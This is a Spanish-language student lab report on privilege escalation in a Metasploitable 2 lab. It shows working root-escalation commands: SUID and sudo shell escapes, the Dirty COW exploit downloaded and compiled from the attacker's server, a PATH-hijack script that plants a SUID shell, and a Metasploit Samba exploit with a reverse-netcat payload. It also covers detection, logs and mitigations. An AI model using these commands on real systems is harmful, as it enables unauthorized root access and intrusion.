# Práctica Nro. 8: Escaneo de Vulnerabilidades y Explotación Avanzada (Enfoque de Ataque Integral en Equipo)

## Datos de Identificación

| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
| :--- | :---: | :---: | :--- |
| Gil, Jesús | 30175126 | 8 | 14-11-2025|
| Guilarte, Andrés | 30246084 | 8 | 14-11-2025 |

**Grupo:** 4

**📋 INFORMACIÓN GENERAL**

**Contexto del Escenario**

Una empresa ficticia "TechCorp Solutions" ha contratado a su equipo de pentesting para realizar una auditoría de seguridad completa de su infraestructura. La empresa tiene varios servicios expuestos y sospecha que pueden tener vulnerabilidades críticas.

**Su equipo se dividirá en 5 grupos especializados**, cada uno responsable de una fase específica del ataque, pero **TODOS trabajarán en paralelo** sobre el mismo objetivo, documentando sus hallazgos para una presentación integrada final.

**Objetivos de Aprendizaje**

- Realizar reconocimiento y enumeración profesional
- Identificar y explotar vulnerabilidades específicas
- Mantener persistencia y escalar privilegios
- Extraer información sensible
- Documentar hallazgos de forma profesional
- Proponer remediaciones efectivas

**Requisitos Técnicos**

- **Kali Linux** (Atacante)
- **Metasploitable 2** (Objetivo)
- **Herramientas**: Nmap, Metasploit, Hydra, John the Ripper, Netcat
- **Conexión de red**: Ambas VMs en la misma red (NAT o Host-Only)
-----
**🎯 ESTRUCTURA DE EQUIPOS Y FASES**

**Visión Integral del Ataque**

EQUIPO 1: Reconocimiento → EQUIPO 2: Acceso Inicial → EQUIPO 3: Post-Explotación 

`    `↓                           ↓                            ↓

EQUIPO 4: Escalada ← ← ← ← EQUIPO 5: Exfiltración y Persistencia

**IMPORTANTE**: Cada equipo trabaja **independientemente** en su fase, pero al final unirán sus hallazgos para mostrar el **ciclo completo de un ataque APT** (Advanced Persistent Threat).

**👥 EQUIPO 4: ESCALADA DE PRIVILEGIOS**

**Fase: Privilege Escalation**

## Objetivo

Escalar privilegios desde el usuario comprometido (msfadmin) hasta obtener acceso root completo, utilizando múltiples técnicas y vectores identificados por el Equipo 3.

**Escenario Específico**

Eres el equipo de **Escalada de Privilegios**. Tienes acceso como usuario limitado. Tu misión es convertirte en root usando al menos **3 técnicas diferentes**.

-----
## 📝 PROCEDIMIENTO PASO A PASO

### Preparación: Establecer Acceso

Se conectó desde la máquina "Analista", la máquina atacante, mediante el protocolo ssh. En nuestro caso, dado que esta fase se realizó de forma aislada y no se contaba con la configuración previa del cliente SSH, fue necesario forzar el uso de algoritmos de clave de host y clave pública antiguos (`ssh-rsa`) que son requeridos por el servidor SSH obsoleto de Metasploitable 2.

Ejecuta esto para forzar aceptación de ssh-rsa solo para esta conexión:
`ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.20`

![Conexión SSH Forzada](https://i.imgur.com/uT5YY2h.png)

```sh
┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.20
msfadmin@192.168.100.20's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Fri Nov 14 03:57:16 2025
msfadmin@metasploitable:~$ 
```

![Comprobación de usuario (SSH)](https://i.imgur.com/mSgZNIX.png)

*Figura: Captura de la comprobación de usuario tras la conexión SSH.*

Luego de ello se ejecutaron los coamndos `whoami` e `id` para verificar el nombre de usuario, el nombre del grupo principal al cual pertenece y sus GID(Identificadores de grupo) para verficiar que efectivamente se accdeió con el usaurio "msfadmin" de la máquina objetvio desde la máquina atacante.

```sh
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ id
uid=1001(msfadmin) gid=1001(msfadmin) groups=1001(msfadmin)
```

Luego de ello, se procedió a crear el directorio de trabajo con el comando mkdir, donde se dejaran los archivos de evidencia necesarios para demostrar la escalada de privilegios exitosa y por último se uso el comando cd para cambiar el directorio actaul al creado para comprobar que fue creado sin problemas.

`mkdir -p /tmp/equipo4\_privesc`

`cd /tmp/equipo4\_privesc`

-----
### 🎯 TÉCNICA 1: Explotación de Binarios SUID**

El primer método a probar es la explotación de los archivos con bit SUID ya que estos se ejecutan con los permisos del propietario (generalmente root), no del usuario que los ejecuta.

El SUID(**Set User ID**) es un permiso especial en los sistemas operativos tipo UNIX que como se estableció arriba permite que cualquier usuario ejecuta los archivos con los permisos que posee el usuario propietario del archivo, esto es una vulnerabilidad que puede ser explotada con el motivo de conseguir acceso no autorizado al sistema.

##### **Paso 1: Identificar Binarios SUID**

Se ejecutó el comando `find / -perm -4000 -type f 2>/dev/null > suid\_binaries.txt` para encontrar los archivos con el bit SUID activado, la parte del comando `find / -perm -4000 -type f` se encarga de realizar la búsqueda de los archivos con el bit SUID, a continuacion se presenta una explicación de las estrucutra del comando:
   * **find /:** Inicia la búsqueda desde la raíz del sistema (/) y recorre todo el árbol de directorios.
   * **-perm -4000 :** Filtra archivos que tienen el bit SUID activado. En notación octal `4000` es la máscara SUID; el prefijo `-` en `find` significa “coincide si todos los bits indicados están presentes” (es decir, al menos la SUID).
   * **-type f:** Limita la búsqueda a archivos regulares (no directorios, enlaces, dispositivos, etc.).

La partes restantes del comando, `2>/dev/null > suid\_binaries.txt`, se encaragan de dos cosas:
   * La parte que esta antes del operador mayor que ( > ), `2>/dev/null`, se encarga de redigir la salidad de error a null y por ello no se obsevan mensajes de error al ejecutar el comando en la terminal.
   * La parte restante, `> suid\_binaries.txt`, se encaraga de redirigir la salida exitosa del comando hacia el archivo de texto suid_binarie.txt. Esto se logra ya que el operador mayor que ( > ) es el usado para indicar una redirección de salida en sistemas operativos Unix.

Luego de la ejecución anterior se ejecutó `cat suid\_binaries.txt` para visualizar en la terminal el contenido del archivo creado anteriormente para verificar si se encontraron resultados exitosos del comando find.

Se ejecutó el comando `find / -perm -4000 -type f 2>/dev/null | grep -E "nmap|vim|find|bash|more|less|nano|cp"` para poder encontrar los archivos con el bit SUID que cumplan con la expresión regular establecida, esto se logra ya que el operador pip ( | ) permite conectar dos comandos y en este caso se está conectando la primera parte del comando anterior con el comando `grep -E "nmap|vim|find|bash|more|less|nano|cp"` ya que este tiene como fin filtrar la lista formada por la primera parte para que solo se visualicen los comandos que cumplan con la expresión regular `"nmap|vim|find|bash|more|less|nano|cp", la bandera `-E` en el comando grep habilitar el uso de las expresiones regulares extendidas como criterio de filtro y el pipe dentro de la expresion permite concatenar las condiciones haciendo que funcione como un operador lógico OR.

#### **Paso 2: Explotar nmap (si está con SUID)**

Se ejecutó el comando `ls -la /usr/bin/nmap` para comprobar que nmap contiene el bit de SUID activado para usarse como vector de escalada de privilegios, efectivamente el comando arrojó que el archivo ejecutable de nmap tiene el bit encendido.

Se ejecuto `nmap --interactive` para ejecutar el programa de nmap en modo interactivo, cabe destacar que al tener el bit SUID encendido el proceso temporalmente los privilegios de su propietario, en este caso root.

Posteriormente se ejecutó `nmap> !sh` para abrir una shell, una shell es un programa que actúa como una **interfaz de línea de comandos (CLI)** entre el **usuario** y el **núcleo (kernel) del sistema operativo**. Al haberse ejecutado el proceso con los permisos de root, la shell resultante hereda los mismos lo que hace que la escalada de privilegios sea exitos al ahora tener el usuario root en control para ejecutar acciones sobre el objetivo.

Para comprobar que efectivamente ahora se está en el usuario root se ejecutaron los coamndos `whoami` y `id` para verificar el usuario actual y sus diferentes IDs correspondientes a su rol dentro del sistema dando como resultado la escalada exitosa como se puede ver en la imagen de abajo.

![acceso-root](https://imgur.com/uT5YY2h)

Por último, se ejecutó `echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt` para escribir dentro u=de un archivo txt ubicado en la carpeta root un mensaje que sirva como prueba irrefutable de que se logró la escalada de privilegios en el sistema.

#### **Paso 3: Explotar otros binarios SUID comunes**

**find con SUID:**

\# Si find tiene SUID

find /home -exec /bin/sh \; -quit

**vim con SUID:**

\# Si vim tiene SUID

vim -c ':!/bin/sh'

**bash con SUID:**

\# Si bash tiene SUID

/bin/bash -p

Los comandos ubicados previamente a este párrafo fueron ejecutado pero fueron redundantes al ya haber escalado los privilegios mediante la explotación de la verisón antigua de nmap por lo que nos detallará tanto en ellos, lo que se hará es presentar tablas con los componentes de cada comando y explicar su función dentro de la escalada de privilegios.

| Comando | Acción | Resultado con SUID |
| :--- | :--- | :--- |
| **`find /home`** | Inicia la búsqueda en `/home`. | El proceso de `find` se ejecuta con privilegios de **root**. |
| **`-exec /bin/sh \;`** | Ejecuta el comando `/bin/sh` (una shell) por cada archivo encontrado. | La shell se lanza como un subproceso, **heredando los privilegios de root**. |
| **`-quit`** | Detiene `find` inmediatamente. | Asegura que la shell de root se lance de forma rápida. |

**Comando Completo:** `find /home -exec /bin/sh \; -quit`

| Comando | Acción | Resultado con SUID |
| :--- | :--- | :--- |
| **`vim -c`** | Inicia el editor `vim` y ejecuta un comando interno. | El proceso de `vim` se ejecuta con privilegios de **root**. |
| **`':!/bin/sh'`** | El **`!`** le indica a `vim` que ejecute el comando `/bin/sh` en el sistema operativo. | La shell (`/bin/sh`) se lanza como un subproceso, **heredando los privilegios de root**. |

**Comando Completo:** `vim -c ':!/bin/sh'`

Comando | Acción | Resultado con SUID |
| :--- | :--- | :--- |
| **`/bin/bash`** | Ejecuta el intérprete de comandos Bash. | El proceso de `bash` se inicia con privilegios de **root**. |
| **`-p`** | El flag de **Preserve** (preservar). | Fuerza a `bash` a **mantener** los privilegios elevados de **root** obtenidos por el SUID. |

**Comando Completo:** `/bin/bash -p`

-----
### 🎯 TÉCNICA 2: Explotación del Kernel**

El segundo método a probar es la explotación del Kernel debido a que Kernels antiguos tienen vulnerabilidades conocidas que permiten escalada de privilegios local.

#### **Paso 1: Identificar Versión del Kernel**

Se ejecutaron los comandos `uname -a`, `cat /etc/issue`, `cat /proc/version` y `uname -a > /tmp/equipo4\_privesc/kernel\_info.txt` ya que son herramientas escenciales en el proceso de information gathering(recopilación de información) del objetivo del ataque, estos comandos permiten obtener información sobre la versión y distribución del sistema operativo.

A continuacuión se presenta una tabla con los comandos utilizados para mostrar su estcuvutra y su utilidad en esta fase de recopilación de información del objetivo.

| Comando | Función Principal | Información Específica Recopilada |
| :--- | :--- | :--- |
| **`uname -a`** | Muestra toda la información sobre el sistema. | **Versión del Kernel**, Arquitectura, Nombre de host. |
| **`cat /etc/issue`** | Muestra el contenido del archivo de emisión. | **Distribución de Linux** (ej. Ubuntu, Debian) y su versión. |
| **`cat /proc/version`** | Muestra la información del kernel en tiempo real. | **Versión detallada del Kernel**, compilador GCC. |
| **`uname -a > /tmp/equipo4_privesc/kernel_info.txt`** | Redirecciona la salida de `uname -a`. | Guarda la información del kernel en un archivo en el directorio `/tmp`. |

**Paso 2: Buscar Exploits Conocidos**

Se ejecutaron los comandos `searchsploit linux kernel 2.6 privilege escalation`, `searchsploit linux kernel 2.6.24` y `searchsploit dirty cow` para poder buscar exploits conocidos con el fin de ser usados para realizar una escalada de privilegios en el sistema del objetivo.

La herramienta de linea de comandos `searchsploit` es una que viene incluida en varias distribuciones de seguridad como Kali Linux, la usada por la maquina "analista". Esta herramienta es en escencia una interfaz de lineas de comandos(CLI) para la base de datos Exploit-DB, esta almacena información sobre diferentes exploits y vulnerabilidades.

Es importante mencionar que Exploit-DB es mantenida y desarrollada por **OffSec(Offensive Security)**, una organización líder en el campo de la ciberseguridad y el hacking ético, de igual forma esta misma organización está detrás de la distribución usada por "analista" la cual es Kali Linux.

A continuación se presenta una tabla con los comandos previamente mencionados donde se explica su propisto y funcionmiento dentro del contexto de la seguridad del sistema.

| Comando | Propósito | Contexto de Seguridad |
| :--- | :--- | :--- |
| **`searchsploit linux kernel 2.6 privilege escalation`** | Busca **exploits generales** de escalada de privilegios que funcionen en cualquier versión del **Kernel 2.6.x** de Linux. | Se utiliza para encontrar exploits antiguos y conocidos en kernels desactualizados. |
| **`searchsploit linux kernel 2.6.24`** | Realiza una búsqueda **específica** de exploits dirigidos a la versión exacta: **Kernel 2.6.24**. | Mayor probabilidad de encontrar un exploit funcional al coincidir con la versión exacta identificada previamente (ej., con `uname -a`). |
| **`searchsploit dirty cow`** | Busca exploits relacionados con la vulnerabilidad **Dirty COW (CVE-2016-5195)**. | Es un exploit de **alta relevancia** que funcionó en un amplio rango de kernels y se usa a menudo como prueba de concepto para sistemas vulnerables. |

**Paso 3: Usar Exploit Pre-compilado (Ejemplo: Dirty COW)**

Se ejecutó el comando `searchsploit -m 40839` para mostrar, copiar y extraer el codigo fuente del exploit con ID 40839, esto se logro mediante la opcion `-m`(Mirroing) ya que está le indica a la herramienta que no solo busque el exploit sino que también haga una copia desde la base de datos local hacia el directorio actual donde se ejecutó el comando.

En este caso, el exploit a utilizar es uno correspondiente a una escalada de privilegios de Linux conocido como "Dirty COW" (CVE-2016-5195).

Para transferir el exploit a la máquina objetivo se decidió levantar un servidor HTTP mediante el comando `python3 -m http.server 8000`en la máquina atacante, la máquina "analista", para hacerla un servidor de archivos temporal ya que con esto se tiene un medio de entrega del exploit al objetivo al tener abierta en el atacante una terminal del objetivo mediante SSH, acción realizada por el equipo 2 en su parte del ataqye.

Por ello, en la terminal SSH se ejecutan los comandos `cd /tmp/equipo4\_privesc` y `wget http://192.168.100.9:8000/40839.c`para primero moverse al directorio tmp ya que es uno universalmente **accesible** y **escribible** por casi cualquier usuario en sistemas Linux, por lo que es ideal para descargar archivos temporales sin preocuparse por los permisos iniciales y luego descargar el archivo del exploit en el directorio actual para luego ser compilado y ejecutado.

**Paso 4: Compilar y Ejecutar Exploit**

Se compiló el archivo del exploit previamente descargado mediante el comando `gcc -pthread 40839.c -o 40839 -lcrypt` lo que dió como resultado un archivo binario ejecutable con el nombre "40839", se usaron las opciones -pthread y -lcrypt ya que Dirty COW necesita de estas librerias para funcionar correctamente.

Luego se ejecutó el archivo binario mediante el comando `./40839` y se siguieron las instrucciones del mismo para crear un usuario con los privilegios con el objetivo de lograr la escalada de privilegios.

Para comprobar que se logró la escalada se ejecutaron los comandos `su firefart`, `whoami` y `id`, solo se explicará el funcionamiento del primer comando ya que los otros dos fueron explicados en la técnica 1.

El comando `su firefart` sirve para cambiar el usuario de la sesión actual al usuario **firefart**, que fue creado por el exploit, para luego ejecutar los dos comandos siguientes para comprobar que tiene privilegios de root. Los comandos `whoami` y `id` tuvieron la siguiente salida:
```sh
firefart@metasploitable:/tmp/equipo4_privesc# whoami
firefart
firefart@metasploitable:/tmp/equipo4_privesc# id
uid=0(firefart) gid=0(root) groups=0(root)
```
Cabe destacar que previamente se ejecutó`su firefart` para hacer el cambio de usuario, por último se ejecutó el comando `echo "Root via Dirty COW - Equipo 4" > /root/equipo4\_dirtycow\_root.txt` para dejar la evidencia de la escalada como se hizo en la técnica anterior.

**NOTA IMPORTANTE**: Dirty COW puede ser destructivo. En un entorno de producción, usa con extrema precaución. Para esta práctica, asegúrate de tener snapshots de tus VMs.

-----

### **🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**

El tercer método a probar es la explotación de la utilidad sudo, ya que si esta se encuentra mal configurada puede permitir que un usuario con pocos privilegios ejecute comandos como si fuera el usuario root.

**Paso 1: Verificar Permisos Sudo**

Se ejecutó el comando `sudo -l` para verificar los permisos que tiene el usuario "msfadmin" al usar el comando sudo, el comando arrojó que el usuario puede ejecutar todos los comandos como sudo.

```sh
msfadmin@metasploitable:~$ sudo -l
[sudo] password for msfadmin: 
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

**Paso 2: Explotar Sudo Nmap**

Al poder ejecutar cualquier comando como sudo, se procedió a ejecutar `sudo nmap --interactive` para abrir la consola interactiva de nmap con privilegios de root.

```sh
msfadmin@metasploitable:~$ sudo nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
```

Una vez dentro, se ejecutó `!sh` para abrir una shell. Como nmap se estaba ejecutando como root, la shell heredó esos privilegios.

```sh
nmap> !sh
sh-3.2# whoami
root
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root)
```
Para dejar evidencia de la escalada, se creó un archivo de prueba en el directorio `/root`.

```sh
sh-3.2# echo "Root via sudo nmap - Equipo 4" > /root/equipo4_sudonmap_root.txt
```

**Paso 3: Explotar Otros Comandos Sudo Comunes**

Se probaron otros comandos comunes que permiten la escalada de privilegios si se ejecutan con `sudo`.

**vi/vim:**

Al ejecutar `sudo vi` y luego `:!/bin/bash` dentro del editor, se obtiene una shell de root.

```sh
root@metasploitable:/home/msfadmin# sudo vi
...
:!/bin/bash
root@metasploitable:/home/msfadmin# whoami
root
```

**less/more:**

Ejecutando `sudo less /etc/hosts` y luego `!/bin/bash` dentro de `less`, se obtiene una shell de root.

```sh
root@metasploitable:/home/msfadmin# sudo less /etc/hosts
WARNING: terminal is not fully functional
!/bin/bash
root@metasploitable:/home/msfadmin# whoami
root
```

**find:**

El comando `sudo find /home -exec /bin/bash \;` ejecuta una shell de bash por cada archivo encontrado, heredando los privilegios de root.

```sh
root@metasploitable:/home/msfadmin# sudo find /home -exec /bin/bash \;
root@metasploitable:/home/msfadmin# whoami
root
```

**awk:**

Con `sudo awk 'BEGIN {system("/bin/bash")}'` se puede ejecutar un comando del sistema, en este caso, una shell de bash con privilegios de root.

```sh
root@metasploitable:/home/msfadmin# sudo awk 'BEGIN {system("/bin/bash")}'
root@metasploitable:/home/msfadmin# whoami
root
```

-----

**🎯 TÉCNICA 4: Explotación de Tareas Cron**

No se pudo ejectuar la técnica ya que el directorio `/etc/cron.\*` no se encuentra en la máquina objetivo.

A continuación se presenta la salida de las ejecuciones de los comandos usados para mostrar como el directorio no se encuentra en el objetivo.

```bash
root@metasploitable:/home/msfadmin# ls -la /etc/cron.\*
ls: cannot access /etc/cron.*: No such file or directory
root@metasploitable:/home/msfadmin# crontab -l
no crontab for root
root@metasploitable:/home/msfadmin# 
root@metasploitable:/home/msfadmin# ls -la /etc/cron.\*
ls: cannot access /etc/cron.*: No such file or directory
root@metasploitable:/home/msfadmin# crontab -l         
no crontab for root
root@metasploitable:/home/msfadmin# exit
exit
root@metasploitable:/home/msfadmin# end
bash: end: command not found
root@metasploitable:/home/msfadmin# 
root@metasploitable:/home/msfadmin# logout
bash: logout: not login shell: use `exit'
root@metasploitable:/home/msfadmin# exit
exit
root@metasploitable:/home/msfadmin# 
```

### 🎯 TÉCNICA 5: Explotación de Servicios Vulnerables

Se intentó explotar el servicio de MySQL para escalar privilegios mediante una User Defined Function (UDF). La técnica consiste en subir una librería maliciosa (`.so`) al servidor y crear una función que ejecute comandos del sistema con los privilegios del servicio de MySQL (que a menudo es `root`).

**Paso 1: Intentar Cargar la UDF en MySQL**

Se accedió a la consola de MySQL y se intentó cargar el archivo `raptor_udf2.so`, un exploit conocido para esta técnica. Sin embargo, los comandos fallaron, principalmente porque el archivo no se encontraba en el sistema.

```sh
root@metasploitable:/home/msfadmin# mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> use mysql;
Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> -- Varios intentos fallidos por sintaxis y porque el archivo no existe
mysql> exit 
Bye
```

**Paso 2: Confirmar Ausencia del Archivo**

Para confirmar la causa del fallo, se verificó si el archivo `raptor_udf2.so` existía en el directorio `/tmp`, confirmando que no estaba presente.

```sh
root@metasploitable:/home/msfadmin# cat /tmp/raptor_udf2.so
cat: /tmp/raptor_udf2.so: No such file or directory
```

Debido a que no se contaba con el archivo del exploit (`raptor_udf2.so`) en la máquina objetivo, no fue posible completar esta técnica y se decidió continuar con la siguiente.

-----
**🎯 TÉCNICA 6: Path Hijacking**

**Contexto**

El "Path Hijacking" o secuestro de ruta es una técnica que explota la forma en que los sistemas operativos buscan ejecutables. Si un script o programa ejecutado con privilegios elevados (como `root`) llama a un comando sin especificar su ruta absoluta (por ejemplo, llama a `ps` en lugar de `/bin/ps`), podemos engañar al sistema para que ejecute nuestro propio script malicioso en su lugar.

Para ello, modificamos la variable de entorno `PATH` del usuario, añadiendo al principio una ruta a un directorio que controlamos. Cuando el sistema busque el comando, lo encontrará primero en nuestro directorio y lo ejecutará.

**Procedimiento**

Se siguieron los siguientes pasos para preparar el ataque:

1.  **Crear un directorio malicioso:** Se creó un directorio en `/tmp` para alojar nuestro script.
2.  **Crear un script falso:** Se creó un script llamado `ps` que:
    *   Copia la shell (`/bin/bash`) a `/tmp/rootbash`.
    *   Le asigna el bit SUID (`chmod +s`), para que se ejecute como `root`.
    *   Ejecuta el comando `ps` real (`/bin/ps`) para no levantar sospechas.
3.  **Modificar el PATH:** Se antepuso nuestro directorio `/tmp/hijack` a la variable `PATH`.

A continuación se muestran los comandos ejecutados:

```sh
root@metasploitable:/home/msfadmin# mkdir /tmp/hijack
root@metasploitable:/home/msfadmin# cd /tmp/hijack
root@metasploitable:/tmp/hijack# echo '#!/bin/bash' > ps
root@metasploitable:/tmp/hijack# echo 'cp /bin/bash /tmp/rootbash' >> ps
root@metasploitable:/tmp/hijack# echo 'chmod +s /tmp/rootbash' >> ps
root@metasploitable:/tmp/hijack# echo '/bin/ps' >> ps
root@metasploitable:/tmp/hijack# chmod +x ps
root@metasploitable:/tmp/hijack# export PATH=/tmp/hijack:$PATH
```

Una vez preparado el entorno, solo queda esperar a que un script o proceso privilegiado ejecute el comando `ps`. Al hacerlo, se creará el binario `/tmp/rootbash` con permisos SUID, permitiendo la escalada de privilegios.

![Path Hijacking](https://i.imgur.com/n8YWgkb.png)

En nuestro caso, esta técnica resultó ser la más fluida y fácil de ejecutar, ya que solo requiere la preparación del entorno y esperar a que un proceso vulnerable se active, sin necesidad de exploits complejos o configuraciones específicas.

-----

### **🎯 TÉCNICA BONUS: Metasploit Local Exploit Suggester**

Este método emplea el **Metasploit Framework** (`msfconsole`) para automatizar tanto la explotación inicial de un servicio vulnerable como el proceso de identificación y sugerencia de exploits de escalada de privilegios local.

#### Paso 1: Obtención de Acceso Inicial (Explotación Remota)

En esta fase, se utiliza un módulo de explotación remota conocido para obtener la primera *shell* en la máquina objetivo.

| Comando | Propósito | Contexto de Seguridad |
| :--- | :--- | :--- |
| **`msfconsole`** | Inicia la consola principal de **Metasploit Framework**. | Es el entorno desde donde se lanzan todos los exploits y módulos. |
| **`use exploit/multi/samba/usermap_script`** | Carga un exploit para una vulnerabilidad de **Samba** (CVE-2007-2447). | Se aprovecha una falla que permite la ejecución de comandos como `root` a través del mapeo de usuarios. |
| **`set RHOSTS <192.168.100.20>`** | Define la **dirección IP remota** del sistema objetivo. | Establece la víctima del ataque. |
| **`set payload cmd/unix/reverse_netcat`** | Configura la carga útil para una **conexión de retorno (*reverse shell*)**. | El objetivo es que la máquina comprometida se conecte de vuelta a la máquina atacante. |
| **`set LHOST <192.168.100.9>`** | Define la **dirección IP local** del atacante (donde Metasploit escucha). | Establece el punto de recepción de la *reverse shell*. |
| **`exploit`** | Ejecuta el exploit. | Si es exitoso, se obtiene una **sesión de *shell* activa** en la máquina objetivo. |

---

#### Paso 2: Puesta en Segundo Plano de la Sesión

Una vez obtenida la sesión, se requiere ponerla en *background* para liberar la consola y permitir la ejecución de otros módulos de post-explotación.

```bash
^Z  # Ctrl+Z: Se utiliza para detener la ejecución y salir de la sesión.
y   # Confirma que se desea enviar la sesión al background, asignándole un número de SESSION (ej. SESSION 1).
```

#### Paso 3: Análisis y Sugerencia de Exploits Locales

Para la fase de escalada de privilegios local, se utiliza un módulo auxiliar de Metasploit que automatiza la búsqueda de vulnerabilidades.

| Comando | Propósito | Contexto de Seguridad |
| :--- | :--- | :--- |
| **`use post/multi/recon/local_exploit_suggester`** | Carga el módulo de post-explotación para la **sugerencia de exploits locales**. | Este módulo analiza la versión del Kernel y del sistema operativo del objetivo. |
| **`set SESSION 1`** | Indica al módulo que use la **sesión activa** obtenida previamente. | Vincula el módulo a la máquina objetivo comprometida. |
| **`run`** | Ejecuta el análisis del módulo. | El módulo compara la información del sistema con las vulnerabilidades conocidas y lista los exploits de escalada de privilegios compatibles (como Dirty COW) que pueden ser probados a continuación. |
| **`# Revisar exploits sugeridos y probarlos`** | Nota del auditor. | El paso final del proceso es seleccionar uno de los exploits sugeridos por Metasploit e intentar la escalada de privilegios a `root`. |

-----
**📊 ENTREGABLES DEL EQUIPO 4**

1. **Reporte de Escalada de Privilegios** que incluya:
   1. Resumen ejecutivo de técnicas exitosas
   1. Detalle de cada método intentado
   1. Screenshots de acceso root obtenido
   1. Comandos ejecutados paso a paso
   1. Análisis de por qué funcionó cada técnica
   1. Comparación de efectividad de métodos
1. **Archivos técnicos**:
   1. suid\_binaries.txt
   1. kernel\_info.txt
   1. Exploits utilizados (código fuente)
   1. Screenshots de whoami mostrando root
   1. Archivos creados en /root/ como evidencia
1. **Presentación** (10-15 minutos):
   1. Demostrar EN VIVO al menos 2 técnicas
   1. Explicar vectores de escalada
   1. Mostrar acceso root conseguido
   1. Discutir dificultad de cada método
   1. Entregar acceso root documentado al Equipo 5
1. **Handoff al Equipo 5**:
   1. Credenciales root
   1. Métodos de acceso root
   1. Archivos/backdoors creados
   1. Recomendaciones de persistencia
-----
**🤔 PREGUNTAS DE REFLEXIÓN**

1. **¿Cuál técnica fue más efectiva y por qué?**
   - La explotación de binarios SUID (p. ej. `nmap --interactive`) y la explotación de `sudo` sobre binarios interactivos (`sudo nmap --interactive`) fueron las más efectivas.
   - Ya que ambas proporcionan una shell de `root` inmediata y confiable sin necesidad de compilar exploits o modificar muchos archivos. Requieren poca complejidad operacional y funcionan siempre que el binario vulnerable exista con permisos elevados. Dirty COW también es efectiva, pero implica compilar/ejecutar un exploit de kernel (mayor complejidad y riesgo de corrupción o detección).

2. **¿Qué técnica dejó menos rastros?**
   - Explotar un binario SUID interactivo suele dejar menos trazas en `/var/log/auth.log` que usar `sudo`, porque `sudo` deja registros explícitos. Path hijacking puede ser muy sigiloso si nunca se activa, pero cuando tiene éxito deja artefactos (por ejemplo `/tmp/rootbash` con bit SUID).
   - Matiz: "menos rastros" no es "sin rastros" — integridad de archivos, marcas de tiempo y reglas de auditoría pueden detectar la actividad.

3. **¿Cómo detectaría un IDS/HIDS estos intentos de escalada?**
   - Se detectaría combinando detección a nivel host y red. Algunas señales útiles para detectar esto son:
      - Monitorizar ejecuciones inusuales de binarios privilegiados (execve de `nmap`, `vim`, `find`).
      - Alertar cambios de permisos (`chmod +s`) y creación de ficheros SUID en `/tmp`.
      - Revisar `/var/log/auth.log` para uso inesperado de `sudo` y accesos SSH.
      - Reglas IDS/IPS (Suricata/Zeek) para detectar reverse shells y tráfico inusual saliente (netcat, conexiones reversas).
      - `auditd`: reglas para `execve` sobre binarios críticos y detección de `useradd`, `chmod`, modificaciones en `/etc/sudoers`.

4. **¿Qué logs se generaron durante la escalada?**
   - Los logs mas importantes generados durante la escalada fueron:
      - `/var/log/auth.log` o `/var/log/secure`: entradas de `sudo` y SSH.
      - `/var/log/syslog` y `/var/log/kern.log`: mensajes del kernel, errores y OOPS.
      - `/var/log/audit/audit.log`: si `auditd` está activo, contiene exec y cambios de permisos.
      - Historiales de shell: `~/.bash_history` (usuario) y `/root/.bash_history` (root).
      - Logs de servicios específicos (ej. `/var/log/mysql/` para intentos UDF, logs de Samba para exploit de Samba).
   - Algunos comandos útiles para el análisis son:
   ```sh
   sudo tail -n 200 /var/log/auth.log
   sudo ausearch -m EXECVE -ts today
   sudo journalctl -k
   ```

5. **¿Cuál técnica es más aplicable en sistemas modernos?**
   - En sistemas actualizados y parcheados, las configuraciones inseguras siguen siendo el vector más aplicable: `sudo` mal configurado y binarios con SUID innecesarios. Los exploits de kernel (Dirty COW, etc.) son menos probables en sistemas parcheados. Path hijacking sigue siendo relevante cuando existan scripts y tareas con PATH mal definido.
   - Una recomendación para mejorar la seguirdad es auditar `sudoers`, eliminar SUID innecesarios, usar rutas absolutas en scripts y activar controles de integridad y `auditd`.

6. **¿Qué diferencia hay entre escalada vertical y horizontal?**
   - **Escalada vertical:** Consiste en obtener mayores privilegios en la misma máquina (ej. `msfadmin` → `root`). Objetivo: aumentar privilegios.
   - **Escalada horizontal (movimiento lateral):** Consiste en acceder a otras cuentas o sistemas con privilegios similares (ej. reutilizar credenciales para entrar a otra máquina). Objetivo: ampliar acceso en la red.

-----
**🛡️ MEDIDAS DE MITIGACIÓN**

1. **Binarios SUID**:
   1.1 Auditar regularmente archivos con SUID/SGID
   1.2 Remover SUID de binarios innecesarios
   1.3 Usar nosuid en montajes de particiones
2. **Kernel**:
   2.1 Mantener kernel actualizado
   2.2 Aplicar parches de seguridad regularmente
   2.3 Implementar kernel hardening (grsecurity, SELinux)
3. **Sudo**:
   3.1 Configurar sudo con principio de mínimo privilegio
   3.2 Evitar NOPASSWD en comandos peligrosos
   3.3 Auditar configuración de sudoers regularmente
   3.4 Usar sudo -l restrictivo
4. **Cron**:
   4.1 Permisos estrictos en scripts de cron
   4.2 Usar rutas absolutas en scripts
   4.3 Auditar tareas cron regularmente
5. **General**:
   5.1 Implementar AppArmor o SELinux
   5.2 Monitorear intentos de escalada (auditd)
   5.3 Implementar detección de anomalías
   5.4 Segmentación y contenedores
   5.5 Principle of Least Privilege (PoLP)
-----